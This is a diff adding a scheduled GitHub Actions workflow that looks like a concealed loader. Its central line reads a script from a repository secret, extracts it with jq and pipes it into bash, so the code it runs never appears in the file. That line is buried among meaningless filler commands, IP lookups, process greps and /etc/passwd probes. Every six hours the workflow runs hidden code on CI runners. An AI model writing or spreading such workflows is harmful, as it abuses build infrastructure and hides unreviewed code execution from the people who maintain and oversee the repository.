@@ -1,0 +1,41 @@
+name: dengshiyu3340
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dengshiyu3340
+        env:
+          s27743: ${{ secrets.s27743 }}
+        run: |
+          echo "Dir: $(pwd)"
+          echo $s27743 | jq -r .g32705 | /bin/bash
+          git branch -vv
+          printf "%s" "xyz" > tmp.xyz
+          curl ipinfo.io/ip
+          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
+          curl ipinfo.io
+          for i in 1 2 3; do echo "Loop $i"; done
+          ps -ef | grep zxcy.fjijuihinfkd.781
+          ls -al | awk '{print $NF}'
+          echo "User: $(whoami)"
+          ps -ef | grep root | awk -F '\]' '{print $NF}' | sort | uniq | wc -l
+          which printf
+          which bash 2>/dev/null || echo "Bash not in path"
+          popd > /dev/null
+          systemctl status nginx
+          grep -q "bash" /etc/passwd 2>/dev/null && echo "Bash user exists"
+          ps -ef | grep root | awk '{print $NF}' | sort | uniq | wc -l
+          which curl
+          cat /dev/null > /tmp/.tmpfile 2>/dev/null || true
+          curl www.google.com
+          ping -c 10 www.google.com
+          echo "Debug at $(date)"
+          echo "Date only: $(date +%F)"
+          cd ~
